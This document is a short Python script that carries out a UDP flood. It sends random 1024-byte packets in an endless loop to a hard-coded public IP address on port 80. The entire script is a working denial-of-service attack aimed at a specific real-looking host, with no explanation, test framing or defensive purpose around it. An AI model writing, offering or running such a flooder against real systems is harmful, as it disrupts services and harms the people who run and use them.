import socket
import random

dest_ip = '31.13.85.36'
dest_port = 80

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

packet = random._urandom(1024)

while True:
    sock.sendto(packet, (dest_ip, dest_port))